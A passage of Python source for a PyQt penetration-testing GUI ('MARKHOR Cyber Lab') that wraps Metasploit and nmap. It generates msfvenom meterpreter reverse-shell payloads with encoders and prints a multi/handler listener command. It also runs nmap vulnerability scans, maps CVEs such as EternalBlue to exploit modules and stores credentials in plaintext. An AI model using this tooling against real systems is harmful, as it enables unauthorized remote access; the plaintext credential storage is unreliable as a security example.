            "java/meterpreter/reverse_tcp",
            "php/meterpreter_reverse_tcp",
            "python/meterpreter/reverse_tcp",
            "osx/x64/meterpreter/reverse_tcp",
        ])
        payload_layout.addWidget(self.payload_type, 0, 1)
        
        # LHOST
        payload_layout.addWidget(QLabel("LHOST:"), 1, 0)
        self.payload_lhost = QLineEdit()
        self.payload_lhost.setPlaceholderText("Your IP address (e.g., 192.168.1.100)")
        payload_layout.addWidget(self.payload_lhost, 1, 1)
        
        # LPORT
        payload_layout.addWidget(QLabel("LPORT:"), 2, 0)
        self.payload_lport = QSpinBox()
        self.payload_lport.setRange(1, 65535)
        self.payload_lport.setValue(4444)
        payload_layout.addWidget(self.payload_lport, 2, 1)
        
        # Output format
        payload_layout.addWidget(QLabel("Output Format:"), 3, 0)
        self.payload_format = QComboBox()
        self.payload_format.addItems(["exe", "elf", "raw", "python", "ps1", "vbs", "c", "java", "php"])
        payload_layout.addWidget(self.payload_format, 3, 1)
        
        # Encoding
        payload_layout.addWidget(QLabel("Encoder:"), 4, 0)
        self.payload_encoder = QComboBox()
        self.payload_encoder.addItems(["none", "x86/shikata_ga_nai", "x86/jmp_call_additive", "x86/alpha_mixed"])
        payload_layout.addWidget(self.payload_encoder, 4, 1)
        
        # Iterations
        payload_layout.addWidget(QLabel("Iterations:"), 5, 0)
        self.payload_iterations = QSpinBox()
        self.payload_iterations.setRange(1, 10)
        self.payload_iterations.setValue(1)
        payload_layout.addWidget(self.payload_iterations, 5, 1)
        
        payload_group.setLayout(payload_layout)
        layout.addWidget(payload_group)
        
        # Output section
        output_group = QGroupBox("Output")
        output_layout = QVBoxLayout()
        
        # File path
        file_path_layout = QHBoxLayout()
        self.payload_output_path = QLineEdit()
        self.payload_output_path.setPlaceholderText("Output file path (e.g., payload.exe)")
        file_path_layout.addWidget(self.payload_output_path)
        
        self.browse_btn = QPushButton("📁 Browse")
        self.browse_btn.clicked.connect(self.browse_payload_output)
        file_path_layout.addWidget(self.browse_btn)
        output_layout.addLayout(file_path_layout)
        
        # Generate button
        btn_layout = QHBoxLayout()
        self.generate_btn = QPushButton("⚡ Generate Payload")
        self.generate_btn.clicked.connect(self.generate_payload)
        self.generate_btn.setStyleSheet("background-color: #00ff00; color: #000000; font-size: 14px; padding: 10px;")
        btn_layout.addWidget(self.generate_btn)
        
        # Advanced options button
        advanced_btn = QPushButton("🔧 Advanced Options")
        advanced_btn.clicked.connect(self.show_advanced_payload_options)
        btn_layout.addWidget(advanced_btn)
        
        output_layout.addLayout(btn_layout)
        
        # Payload preview
        preview_group = QGroupBox("Payload Preview")
        preview_layout = QVBoxLayout()
        self.payload_preview = QTextEdit()
        self.payload_preview.setReadOnly(True)
        self.payload_preview.setMaximumHeight(100)
        self.payload_preview.setPlaceholderText("Generated payload command will appear here...")
        preview_layout.addWidget(self.payload_preview)
        preview_group.setLayout(preview_layout)
        output_layout.addWidget(preview_group)
        
        output_group.setLayout(output_layout)
        layout.addWidget(output_group)
        
        layout.addStretch()
        return page
        
    def show_advanced_payload_options(self):
        """Show advanced payload options dialog"""
        dialog = QWidget()
        dialog.setWindowTitle("Advanced Payload Options")
        dialog.setModal(True)
        dialog.resize(400, 300)
        
        layout = QVBoxLayout(dialog)
        
        # Additional payload options
        options_group = QGroupBox("Additional Options")
        options_layout = QGridLayout()
        
        # Exe: small
        self.exe_small = QCheckBox("Generate Small Executable")
        options_layout.addWidget(self.exe_small, 0, 0)
        
        # Use templates
        self.use_template = QCheckBox("Use Custom Template")
        options_layout.addWidget(self.use_template, 1, 0)
        
        # Template path
        self.template_path = QLineEdit()
        self.template_path.setPlaceholderText("Path to custom template")
        self.template_path.setEnabled(False)
        options_layout.addWidget(self.template_path, 1, 1)
        
        self.use_template.toggled.connect(self.template_path.setEnabled)
        
        # Create service
        self.create_service = QCheckBox("Create Service (Windows)")
        options_layout.addWidget(self.create_service, 2, 0)
        
        options_group.setLayout(options_layout)
        layout.addWidget(options_group)
        
        # Buttons
        btn_layout = QHBoxLayout()
        save_btn = QPushButton("Save")
        save_btn.clicked.connect(dialog.close)
        btn_layout.addWidget(save_btn)
        
        cancel_btn = QPushButton("Cancel")
        cancel_btn.clicked.connect(dialog.close)
        btn_layout.addWidget(cancel_btn)
        
        layout.addLayout(btn_layout)
        
        dialog.show()
        
    def generate_payload(self):
        """Generate payload with enhanced options"""
        payload = self.payload_type.currentText()
        lhost = self.payload_lhost.text().strip()
        lport = self.payload_lport.value()
        output = self.payload_output_path.text().strip()
        fmt = self.payload_format.currentText()
        encoder = self.payload_encoder.currentText()
        iterations = self.payload_iterations.value()
        
        if not lhost:
            QMessageBox.warning(self, "Error", "Please enter LHOST (your IP address)")
            return
        if not output:
            QMessageBox.warning(self, "Error", "Please select output file")
            return
            
        self.show_loading("Generating payload...")
        
        def generate():
            try:
                # Build msfvenom command
                cmd = ['msfvenom', '-p', payload, f'LHOST={lhost}', f'LPORT={lport}', '-f', fmt]
                
                if encoder != "none":
                    cmd.extend(['-e', encoder])
                if iterations > 1:
                    cmd.extend(['-i', str(iterations)])
                    
                cmd.extend(['-o', output])
                
                # Preview command
                preview = " ".join(cmd)
                self.payload_preview.setText(preview)
                
                # Execute
                result = subprocess.run(cmd, capture_output=True, text=True)
                
                if result.returncode == 0:
                    self.log_output(f"[+] Payload generated successfully: {output}")
                    self.show_notification(f"Payload saved to {output}")
                    
                    # Show success dialog with instructions
                    QMessageBox.information(self, "Payload Generated", 
                        f"Payload saved to: {output}\n\n"
                        f"Listener command:\n"
                        f"msfconsole -q -x 'use exploit/multi/handler; "
                        f"set PAYLOAD {payload}; "
                        f"set LHOST {lhost}; "
                        f"set LPORT {lport}; "
                        f"run'")
                else:
                    self.log_output(f"[!] Payload generation failed: {result.stderr}")
                    QMessageBox.critical(self, "Error", f"Generation failed:\n{result.stderr}")
                    
            except Exception as e:
                self.log_output(f"[!] Error: {str(e)}")
                QMessageBox.critical(self, "Error", str(e))
            finally:
                self.hide_loading()
                
        threading.Thread(target=generate, daemon=True).start()
        
    def create_sessions_page(self) -> QWidget:
        """Enhanced sessions page with tabs for multiple sessions"""
        page = QWidget()
        layout = QVBoxLayout(page)
        
        # Session tabs
        self.session_tabs = QTabWidget()
        self.session_tabs.setTabsClosable(True)
        self.session_tabs.tabCloseRequested.connect(self.close_session_tab)
        layout.addWidget(self.session_tabs)
        
        # Session list (for overview)
        sessions_group = QGroupBox("Available Sessions")
        sessions_layout = QVBoxLayout()
        
        self.sessions_list = QListWidget()
        self.sessions_list.itemDoubleClicked.connect(self.open_session_tab)
        sessions_layout.addWidget(self.sessions_list)
        
        # Buttons for session management
        btn_layout = QHBoxLayout()
        refresh_btn = QPushButton("🔄 Refresh")
        refresh_btn.clicked.connect(lambda: self.msf_client.list_sessions())
        btn_layout.addWidget(refresh_btn)
        
        kill_all_btn = QPushButton("💀 Kill All Sessions")
        kill_all_btn.clicked.connect(self.kill_all_sessions)
        btn_layout.addWidget(kill_all_btn)
        
        sessions_layout.addLayout(btn_layout)
        sessions_group.setLayout(sessions_layout)
        layout.addWidget(sessions_group)
        
        return page
        
    def open_session_tab(self, item: QListWidgetItem):
        """Open a new tab for session interaction"""
        session_id = item.data(Qt.UserRole)
        session_info = item.text()
        
        # Create new tab
        tab = QWidget()
        tab_layout = QVBoxLayout(tab)
        
        # Terminal for this session
        terminal = AdvancedTerminal(tab)
        terminal.parent_session = session_id
        terminal.setPlaceholderText(f"Session {session_id} terminal. Type commands and press Enter...")
        tab_layout.addWidget(terminal)
        
        # Info label
        info_label = QLabel(f"Session {session_id}: {session_info}")
        info_label.setStyleSheet("color: #88ff88; padding: 5px;")
        tab_layout.insertWidget(0, info_label)
        
        # Add to tabs
        self.session_tabs.addTab(tab, f"Session {session_id}")
        self.session_tabs.setCurrentWidget(tab)
        
        # Store reference
        if not hasattr(self, 'session_terminals'):
            self.session_terminals = {}
        self.session_terminals[session_id] = terminal
        
        self.log_output(f"[*] Opened interactive tab for session {session_id}")
        
    def close_session_tab(self, index: int):
        """Close a session tab"""
        tab = self.session_tabs.widget(index)
        if tab:
            # Find and remove from storage
            for sid, terminal in getattr(self, 'session_terminals', {}).items():
                if terminal.parent() == tab:
                    del self.session_terminals[sid]
                    break
            self.session_tabs.removeTab(index)
            
    def kill_all_sessions(self):
        """Kill all active sessions"""
        reply = QMessageBox.question(self, "Confirm", 
                                     "Are you sure you want to kill ALL sessions?",
                                     QMessageBox.Yes | QMessageBox.No)
        if reply == QMessageBox.Yes:
            self.log_output("[*] Killing all sessions...")
            self.sessions_list.clear()
            if hasattr(self, 'session_tabs'):
                self.session_tabs.clear()
            if hasattr(self, 'session_terminals'):
                self.session_terminals.clear()
            self.show_notification("All sessions terminated")
            
    def on_sessions_updated(self, sessions: dict):
        """Update sessions list"""
        self.sessions_list.clear()
        for sid, info in sessions.items():
            item = QListWidgetItem(f"Session {sid}: {info.get('type', 'unknown')} - {info.get('tunnel_peer', '')}")
            item.setData(Qt.UserRole, sid)
            self.sessions_list.addItem(item)
        
        if self.dashboard_sessions_count:
            self.dashboard_sessions_count.setText(str(len(sessions)))

def main_enhanced():
    """Enhanced main application entry point"""
    app = QApplication(sys.argv)
    app.setApplicationName(APP_NAME)
    app.setApplicationVersion(APP_VERSION)
    
    # Set application-wide font
    font = QFont("Courier New", 10)
    app.setFont(font)
    
    # Show splash screen
    splash = SplashScreen()
    splash.show()
    
    # Create main window after splash
    QTimer.singleShot(2500, splash.close)
    
    # Use enhanced main window
    main_window = EnhancedMainWindow()
    
    QTimer.singleShot(2600, main_window.show)
    
    sys.exit(app.exec_())

if __name__ == "__main__":
    # Print banner
    print("\033[92m" + ASCII_LOGO + "\033[0m")
    print(f"\033[92m{APP_NAME} v{APP_VERSION}\033[0m")
    print(f"\033[93m{AUTHOR_TAG}\033[0m")
    print(f"\033[91m{SAFETY_NOTICE}\033[0m")
    print("\n" + "="*60)
    
    # Check for required tools
    required_tools = {
        "msfconsole": "Metasploit Framework console",
        "msfvenom": "Metasploit payload generator",
        "nmap": "Network scanner"
    }
    
    missing_tools = []
    for tool, desc in required_tools.items():
        if not shutil.which(tool):
            missing_tools.append(f"  - {tool} ({desc})")
            
    if missing_tools:
        print("\n\033[93m[!] Warning: Some tools are missing:\033[0m")
        for tool in missing_tools:
            print(tool)
        print("\nSome functionality may be limited. Install missing tools for full features.")
        
    print("\n\033[92mStarting MARKHOR CYBER LAB...\033[0m\n")
    
    # Launch application
    main_enhanced()


class LogManager:
    """Centralized logging system with file rotation and filtering"""
    
    def __init__(self, log_file: str = "markhor.log", max_size_mb: int = 10, backup_count: int = 5):
        self.log_file = Path(log_file)
        self.max_size = max_size_mb * 1024 * 1024
        self.backup_count = backup_count
        self.log_queue = queue.Queue()
        self.running = True
        self.logger = logging.getLogger("MARKHOR")
        self.logger.setLevel(logging.DEBUG)
        
        # File handler with rotation
        self._setup_file_handler()
        
        # Console handler
        console_handler = logging.StreamHandler()
        console_handler.setLevel(logging.INFO)
        console_formatter = logging.Formatter('%(asctime)s - %(levelname)s - %(message)s')
        console_handler.setFormatter(console_formatter)
        self.logger.addHandler(console_handler)
        
        # Start background writer thread
        self.writer_thread = threading.Thread(target=self._writer_loop, daemon=True)
        self.writer_thread.start()
        
    def _setup_file_handler(self):
        """Setup file handler with rotation"""
        file_handler = logging.FileHandler(self.log_file)
        file_handler.setLevel(logging.DEBUG)
        file_formatter = logging.Formatter('%(asctime)s - %(name)s - %(levelname)s - %(message)s')
        file_handler.setFormatter(file_formatter)
        self.logger.addHandler(file_handler)
        
    def _writer_loop(self):
        """Background thread for writing logs"""
        while self.running:
            try:
                level, msg, exc_info = self.log_queue.get(timeout=1)
                if exc_info:
                    self.logger.log(level, msg, exc_info=exc_info)
                else:
                    self.logger.log(level, msg)
            except queue.Empty:
                continue
                
    def log(self, level: int, msg: str, exc_info=None):
        """Add log entry to queue"""
        self.log_queue.put((level, msg, exc_info))
        
    def debug(self, msg: str):
        self.log(logging.DEBUG, msg)
        
    def info(self, msg: str):
        self.log(logging.INFO, msg)
        
    def warning(self, msg: str):
        self.log(logging.WARNING, msg)
        
    def error(self, msg: str, exc_info=None):
        self.log(logging.ERROR, msg, exc_info)
        
    def critical(self, msg: str, exc_info=None):
        self.log(logging.CRITICAL, msg, exc_info)
        
    def stop(self):
        """Stop the logger"""
        self.running = False
        self.writer_thread.join(timeout=2)
        
    def rotate_logs(self):
        """Rotate log files if needed"""
        if self.log_file.exists() and self.log_file.stat().st_size > self.max_size:
            for i in range(self.backup_count - 1, 0, -1):
                old = self.log_file.with_suffix(f".log.{i}")
                new = self.log_file.with_suffix(f".log.{i+1}")
                if old.exists():
                    old.rename(new)
            if self.log_file.exists():
                self.log_file.rename(self.log_file.with_suffix(".log.1"))
            self._setup_file_handler()


class ReportGenerator:
    """Generate penetration testing reports in various formats"""
    
    def __init__(self):
        self.data = {
            "scan_results": [],
            "exploits_used": [],
            "sessions": [],
            "commands_executed": [],
            "findings": []
        }
        
    def add_scan_result(self, target: str, result: str):
        """Add scan result to report"""
        self.data["scan_results"].append({
            "timestamp": datetime.now().isoformat(),
            "target": target,
            "result": result
        })
        
    def add_exploit_used(self, exploit: str, success: bool, output: str):
        """Add exploit usage to report"""
        self.data["exploits_used"].append({
            "timestamp": datetime.now().isoformat(),
            "exploit": exploit,
            "success": success,
            "output": output
        })
        
    def add_session(self, session_id: int, info: dict):
        """Add session info to report"""
        self.data["sessions"].append({
            "timestamp": datetime.now().isoformat(),
            "session_id": session_id,
            "info": info
        })
        
    def add_finding(self, severity: str, title: str, description: str, remediation: str):
        """Add security finding to report"""
        self.data["findings"].append({
            "timestamp": datetime.now().isoformat(),
            "severity": severity,
            "title": title,
            "description": description,
            "remediation": remediation
        })
        
    def generate_html(self, output_file: str):
        """Generate HTML report"""
        html_template = f"""
        <!DOCTYPE html>
        <html>
        <head>
            <title>MARKHOR Forge - Penetration Test Report</title>
            <style>
                body {{
                    font-family: 'Courier New', monospace;
                    background-color: #0a0a0a;
                    color: #00ff00;
                    margin: 20px;
                }}
                h1, h2 {{
                    color: #00ff00;
                    border-bottom: 1px solid #00ff00;
                }}
                .severity-critical {{ color: #ff0000; }}
                .severity-high {{ color: #ff6600; }}
                .severity-medium {{ color: #ffcc00; }}
                .severity-low {{ color: #00ff00; }}
                .finding {{
                    border: 1px solid #00ff00;
                    margin: 10px;
                    padding: 10px;
                    border-radius: 5px;
                }}
                pre {{
                    background-color: #1e1e1e;
                    padding: 10px;
                    border-radius: 5px;
                    overflow-x: auto;
                }}
                table {{
                    width: 100%;
                    border-collapse: collapse;
                }}
                th, td {{
                    border: 1px solid #00ff00;
                    padding: 8px;
                    text-align: left;
                }}
                th {{
                    background-color: #1e1e1e;
                }}
            </style>
        </head>
        <body>
            <h1>MARKHOR Forge - Penetration Test Report</h1>
            <p>Generated: {datetime.now().strftime("%Y-%m-%d %H:%M:%S")}</p>
            
            <h2>Executive Summary</h2>
            <p>This report summarizes the penetration testing activities conducted using MARKHOR Forge.</p>
            
            <h2>Scan Results</h2>
            {self._generate_scan_html()}
            
            <h2>Exploits Used</h2>
            {self._generate_exploits_html()}
            
            <h2>Sessions</h2>
            {self._generate_sessions_html()}
            
            <h2>Findings</h2>
            {self._generate_findings_html()}
            
            <h2>Recommendations</h2>
            <ul>
                <li>Apply security patches for identified vulnerabilities</li>
                <li>Implement network segmentation</li>
                <li>Enable logging and monitoring</li>
                <li>Regular security assessments</li>
            </ul>
            
            <p style="margin-top: 50px; text-align: center;">Report generated by MARKHOR Forge - {AUTHOR_TAG}</p>
        </body>
        </html>
        """
        
        with open(output_file, 'w') as f:
            f.write(html_template)
            
    def _generate_scan_html(self) -> str:
        """Generate HTML for scan results"""
        if not self.data["scan_results"]:
            return "<p>No scan results recorded.</p>"
            
        html = "<table><tr><th>Timestamp</th><th>Target</th><th>Result</th></tr>"
        for result in self.data["scan_results"]:
            html += f"<tr><td>{result['timestamp']}</td><td>{result['target']}</td><td><pre>{result['result'][:500]}...</pre></td></tr>"
        html += "</table>"
        return html
        
    def _generate_exploits_html(self) -> str:
        """Generate HTML for exploits used"""
        if not self.data["exploits_used"]:
            return "<p>No exploits executed.</p>"
            
        html = "<table><tr><th>Timestamp</th><th>Exploit</th><th>Success</th><th>Output</th></tr>"
        for exploit in self.data["exploits_used"]:
            success_class = "severity-low" if exploit['success'] else "severity-critical"
            html += f"<tr><td>{exploit['timestamp']}</td><td>{exploit['exploit']}</td>"
            html += f"<td class='{success_class}'>{'✅' if exploit['success'] else '❌'}</td>"
            html += f"<td><pre>{exploit['output'][:200]}...</pre></td></tr>"
        html += "</table>"
        return html
        
    def _generate_sessions_html(self) -> str:
        """Generate HTML for sessions"""
        if not self.data["sessions"]:
            return "<p>No sessions established.</p>"
            
        html = "<table><tr><th>Timestamp</th><th>Session ID</th><th>Info</th></tr>"
        for session in self.data["sessions"]:
            html += f"<tr><td>{session['timestamp']}</td><td>{session['session_id']}</td>"
            html += f"<td><pre>{json.dumps(session['info'], indent=2)}</pre></td></tr>"
        html += "</table>"
        return html
        
    def _generate_findings_html(self) -> str:
        """Generate HTML for findings"""
        if not self.data["findings"]:
            return "<p>No findings recorded.</p>"
            
        html = ""
        for finding in self.data["findings"]:
            severity_class = f"severity-{finding['severity'].lower()}"
            html += f"""
            <div class="finding">
                <h3 class="{severity_class}">{finding['title']} [{finding['severity'].upper()}]</h3>
                <p><strong>Description:</strong> {finding['description']}</p>
                <p><strong>Remediation:</strong> {finding['remediation']}</p>
                <p><small>Found: {finding['timestamp']}</small></p>
            </div>
            """
        return html


class NetworkScanner:
    """Advanced network scanner with multiple scan techniques"""
    
    def __init__(self):
        self.scan_results = []
        
    def quick_scan(self, target: str) -> str:
        """Perform quick port scan"""
        try:
            cmd = ['nmap', '-sS', '-sV', '-T4', '-F', target]
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=60)
            return result.stdout
        except subprocess.TimeoutExpired:
            return "[!] Scan timeout expired"
        except Exception as e:
            return f"[!] Scan failed: {str(e)}"
            
    def full_scan(self, target: str) -> str:
        """Perform full vulnerability scan"""
        try:
            cmd = ['nmap', '-sS', '-sV', '-sC', '-O', '-T4', '-p-', '--script=vuln', target]
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=300)
            return result.stdout
        except subprocess.TimeoutExpired:
            return "[!] Scan timeout expired (full scan takes longer)"
        except Exception as e:
            return f"[!] Scan failed: {str(e)}"
            
    def os_detection(self, target: str) -> str:
        """Perform OS detection scan"""
        try:
            cmd = ['nmap', '-O', '--osscan-guess', target]
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=60)
            return result.stdout
        except Exception as e:
            return f"[!] OS detection failed: {str(e)}"
            
    def service_detection(self, target: str, ports: str = "1-1000") -> str:
        """Detect services on specific ports"""
        try:
            cmd = ['nmap', '-sV', '-p', ports, target]
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=120)
            return result.stdout
        except Exception as e:
            return f"[!] Service detection failed: {str(e)}"
            
    def udp_scan(self, target: str) -> str:
        """Perform UDP port scan"""
        try:
            cmd = ['nmap', '-sU', '-T4', '-F', target]
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=90)
            return result.stdout
        except Exception as e:
            return f"[!] UDP scan failed: {str(e)}"
            
    def parse_scan_results(self, scan_output: str) -> dict:
        """Parse nmap output into structured data"""
        results = {
            "hosts": [],
            "open_ports": [],
            "services": [],
            "os_matches": []
        }
        
        lines = scan_output.split('\n')
        current_host = None
        
        for line in lines:
            if "Nmap scan report for" in line:
                current_host = line.split("for ")[-1].strip()
                results["hosts"].append(current_host)
            elif "/tcp" in line and "open" in line:
                parts = line.split()
                if len(parts) >= 3:
                    port_proto = parts[0]
                    service = parts[2] if len(parts) > 2 else "unknown"
                    results["open_ports"].append(port_proto)
                    results["services"].append({"port": port_proto, "service": service})
            elif "OS guess:" in line or "Aggressive OS guesses:" in line:
                results["os_matches"].append(line.strip())
                
        return results


class CredentialManager:
    """Secure credential storage using system keyring"""
    
    def __init__(self):
        self.credentials = {}
        
    def save_credential(self, service: str, username: str, password: str):
        """Save credential securely"""
        # In production, use keyring or encrypted storage
        # For demo, we'll use a simple dict
        self.credentials[service] = {
            "username": username,
            "password": password,
            "timestamp": datetime.now().isoformat()
        }
        
    def get_credential(self, service: str) -> Optional[dict]:
        """Retrieve credential"""
        return self.credentials.get(service)
        
    def delete_credential(self, service: str):
        """Delete credential"""
        if service in self.credentials:
            del self.credentials[service]
            
    def list_services(self) -> List[str]:
        """List all stored services"""
        return list(self.credentials.keys())
        
    def export_credentials(self, filename: str):
        """Export encrypted credentials"""
        # In production, use encryption
        with open(filename, 'w') as f:
            json.dump(self.credentials, f, indent=4)
            
    def import_credentials(self, filename: str):
        """Import encrypted credentials"""
        with open(filename, 'r') as f:
            self.credentials = json.load(f)


class VulnerabilityDatabase:
    """Local vulnerability database for reference"""
    
    def __init__(self):
        self.vulns = self._load_vuln_data()
        
    def _load_vuln_data(self) -> dict:
        """Load vulnerability data"""
        return {
            "MS17-010": {
                "name": "EternalBlue",
                "cve": "CVE-2017-0144",
                "description": "SMBv1 remote code execution",
                "affected": "Windows 7, Windows Server 2008, Windows 10 (pre-1703)",
                "exploit": "exploit/windows/smb/ms17_010_eternalblue"
            },
            "CVE-2014-0160": {
                "name": "Heartbleed",
                "cve": "CVE-2014-0160",
                "description": "OpenSSL information disclosure",
                "affected": "OpenSSL 1.0.1-1.0.1f",
                "exploit": "exploit/multi/http/openssl_heartbleed"
            },
            "CVE-2014-6271": {
                "name": "Shellshock",
                "cve": "CVE-2014-6271",
                "description": "Bash remote code execution",
                "affected": "Bash <= 4.3",
                "exploit": "exploit/multi/http/apache_mod_cgi_bash_env_exec"
            },
            "CVE-2017-5638": {
                "name": "Apache Struts2 RCE",
                "cve": "CVE-2017-5638",
                "description": "Struts2 REST plugin RCE",
                "affected": "Struts 2.3.5-2.3.31, 2.5-2.5.10",
                "exploit": "exploit/multi/http/struts2_rest_xstream"
            }
        }
        
    def search(self, query: str) -> List[dict]:
        """Search vulnerabilities by CVE or name"""
        results = []
        query_lower = query.lower()
        
        for key, data in self.vulns.items():
            if (query_lower in key.lower() or 
                query_lower in data['cve'].lower() or 
                query_lower in data['name'].lower()):
                results.append(data)
        return results
        
    def get_by_exploit(self, exploit_path: str) -> Optional[dict]:
        """Get vulnerability by exploit path"""
        for key, data in self.vulns.items():
            if data['exploit'] == exploit_path:
                return data
        return None



class UltimateMainWindow(EnhancedMainWindow):
    """Ultimate main window with all features integrated"""
    
    def __init__(self):
        self.log_manager = LogManager()
        self.report_generator = ReportGenerator()
        self.vuln_db = VulnerabilityDatabase()
        self.cred_manager = CredentialManager()
        self.network_scanner = NetworkScanner()
        
        super().__init__()
        
        self.setup_advanced_menus()
        self.setup_reporting_tab()
        self.setup_vuln_db_tab()
        
        self.log_manager.info(f"{APP_NAME} started - Version {APP_VERSION}")
        
    def setup_advanced_menus(self):
        """Setup advanced menu bar"""
        menubar = self.menuBar()
        menubar.setStyleSheet("""
            QMenuBar {
                background-color: #0f0f0f;
                color: #00ff00;
                border-bottom: 1px solid #00ff00;
            }
            QMenuBar::item:selected {
                background-color: #1e3a1e;
            }
            QMenu {
                background-color: #0f0f0f;
                color: #00ff00;
                border: 1px solid #00ff00;
            }
            QMenu::item:selected {
                background-color: #1e3a1e;
            }
        """)
        
        # File menu
        file_menu = menubar.addMenu("&File")
        
        save_report_action = QAction("&Generate Report", self)
        save_report_action.triggered.connect(self.generate_report)
        save_report_action.setShortcut("Ctrl+R")
        file_menu.addAction(save_report_action)
        
        export_logs_action = QAction("&Export Logs", self)
        export_logs_action.triggered.connect(self.export_logs)
        file_menu.addAction(export_logs_action)
        
        file_menu.addSeparator()
        
        load_config_action = QAction("&Load Configuration", self)
        load_config_action.triggered.connect(self.load_configuration)
        file_menu.addAction(load_config_action)
        
        save_config_action = QAction("&Save Configuration", self)
        save_config_action.triggered.connect(self.save_configuration)
        file_menu.addAction(save_config_action)
        
        file_menu.addSeparator()
        
        exit_action = QAction("E&xit", self)
        exit_action.triggered.connect(self.close)
        exit_action.setShortcut("Ctrl+Q")
        file_menu.addAction(exit_action)
        
        # Tools menu
        tools_menu = menubar.addMenu("&Tools")
        
        vuln_search_action = QAction("&Vulnerability Search", self)
        vuln_search_action.triggered.connect(self.show_vuln_search)
        tools_menu.addAction(vuln_search_action)
        
        cred_manager_action = QAction("&Credential Manager", self)
        cred_manager_action.triggered.connect(self.show_credential_manager)
        tools_menu.addAction(cred_manager_action)
        
        tools_menu.addSeparator()
        
        network_scan_action = QAction("&Advanced Network Scan", self)
        network_scan_action.triggered.connect(self.show_advanced_network_scan)
        tools_menu.addAction(network_scan_action)
        
        # Help menu
        help_menu = menubar.addMenu("&Help")
        
        about_action = QAction("&About", self)
        about_action.triggered.connect(self.show_about)
        help_menu.addAction(about_action)
        
        shortcuts_action = QAction("&Keyboard Shortcuts", self)
        shortcuts_action.triggered.connect(self.show_shortcuts)
        help_menu.addAction(shortcuts_action)
        
    def setup_reporting_tab(self):
        """Add reporting tab to main content"""
        self.report_page = QWidget()
        report_layout = QVBoxLayout(self.report_page)
        
        # Report controls
        controls_group = QGroupBox("Report Generation")
        controls_layout = QHBoxLayout()
        
        self.report_format = QComboBox()
        self.report_format.addItems(["HTML", "JSON", "Text"])
        controls_layout.addWidget(QLabel("Format:"))
        controls_layout.addWidget(self.report_format)
        
        generate_btn = QPushButton("Generate Report")
        generate_btn.clicked.connect(self.generate_report)
        controls_layout.addWidget(generate_btn)
        
        controls_group.setLayout(controls_layout)
        report_layout.addWidget(controls_group)
        
        # Report preview
        preview_group = QGroupBox("Report Preview")
        preview_layout = QVBoxLayout()
        self.report_preview = QTextEdit()
        self.report_preview.setReadOnly(True)
        preview_layout.addWidget(self.report_preview)
        preview_group.setLayout(preview_layout)
        report_layout.addWidget(preview_group)
        
        # Add tab
        self.content_stack.addTab(self.report_page, "📊 Report")
        
    def setup_vuln_db_tab(self):
        """Add vulnerability database tab"""
        self.vuln_page = QWidget()
        vuln_layout = QVBoxLayout(self.vuln_page)
        
        # Search bar
        search_layout = QHBoxLayout()
        self.vuln_search_input = QLineEdit()
        self.vuln_search_input.setPlaceholderText("Search by CVE, name, or exploit...")
        self.vuln_search_input.textChanged.connect(self.search_vulnerabilities)
        search_layout.addWidget(self.vuln_search_input)
        
        vuln_layout.addLayout(search_layout)
        
        # Results tree
        self.vuln_tree = QTreeWidget()
        self.vuln_tree.setHeaderLabels(["CVE", "Name", "Exploit", "Severity"])
        vuln_layout.addWidget(self.vuln_tree)
        
        # Details panel
        details_group = QGroupBox("Vulnerability Details")
        details_layout = QVBoxLayout()
        self.vuln_details = QTextEdit()
        self.vuln_details.setReadOnly(True)
        details_layout.addWidget(self.vuln_details)
        details_group.setLayout(details_layout)
        vuln_layout.addWidget(details_group)
        
        self.vuln_tree.itemClicked.connect(self.show_vuln_details)
        
        # Add tab
        self.content_stack.addTab(self.vuln_page, "🗄️ Vuln DB")
        
        # Load initial data
        self.load_vuln_database()
        
    def load_vuln_database(self):
        """Load vulnerabilities into tree"""
        self.vuln_tree.clear()
        
        for key, data in self.vuln_db.vulns.items():
            item = QTreeWidgetItem(self.vuln_tree, [
                data.get('cve', 'N/A'),
                data.get('name', 'N/A'),
                data.get('exploit', 'N/A'),
                self._get_severity_text(data.get('cve', ''))
            ])
            item.setData(0, Qt.UserRole, key)
            
    def _get_severity_text(self, cve: str) -> str:
        """Get severity based on CVE"""
        if "2017-0144" in cve:
            return "CRITICAL"
        elif "2014-0160" in cve:
            return "HIGH"
        elif "2014-6271" in cve:
            return "HIGH"
        elif "2017-5638" in cve:
            return "CRITICAL"
        return "MEDIUM"
        
    def search_vulnerabilities(self, query: str):
        """Search vulnerabilities"""
        if not query:
            self.load_vuln_database()
            return
            
        self.vuln_tree.clear()
        results = self.vuln_db.search(query)
        
        for data in results:
            item = QTreeWidgetItem(self.vuln_tree, [
                data.get('cve', 'N/A'),
                data.get('name', 'N/A'),
                data.get('exploit', 'N/A'),
                self._get_severity_text(data.get('cve', ''))
            ])
            
    def show_vuln_details(self, item: QTreeWidgetItem, column: int):
        """Show vulnerability details"""
        cve = item.text(0)
        data = self.vuln_db.vulns.get(cve) or self.vuln_db.vulns.get(f"CVE-{cve}")
        
        if data:
            details = f"""
            <h3>{data['name']} ({data['cve']})</h3>
            <p><b>Description:</b> {data['description']}</p>
            <p><b>Affected Systems:</b> {data['affected']}</p>
            <p><b>Metasploit Exploit:</b> {data['exploit']}</p>
            <p><b>Remediation:</b> Apply vendor patches immediately.</p>
            """
            self.vuln_details.setHtml(details)
            
    def generate_report(self):
        """Generate penetration test report"""
        filename, _ = QFileDialog.getSaveFileName(
            self, "Save Report", 
            f"markhor_report_{datetime.now().strftime('%Y%m%d_%H%M%S')}",
            "HTML Files (*.html);;JSON Files (*.json);;Text Files (*.txt)"
        )
        
        if not filename:
            return
            
        format_type = self.report_format.currentText()
        
        try:
            if format_type == "HTML":
                self.report_generator.generate_html(filename)
                self.show_notification(f"Report saved to {filename}")
            elif format_type == "JSON":
                # Generate JSON report
                with open(filename, 'w') as f:
                    json.dump(self.report_generator.data, f, indent=4)
                self.show_notification(f"JSON report saved to {filename}")
            else:
                # Generate text report
                with open(filename, 'w') as f:
                    f.write(f"MARKHOR Cyber Lab Report\n")
                    f.write(f"Generated: {datetime.now()}\n")
                    f.write(f"{'='*60}\n\n")
                    f.write(f"Scan Results: {len(self.report_generator.data['scan_results'])}\n")
                    f.write(f"Exploits Used: {len(self.report_generator.data['exploits_used'])}\n")
                    f.write(f"Sessions: {len(self.report_generator.data['sessions'])}\n")
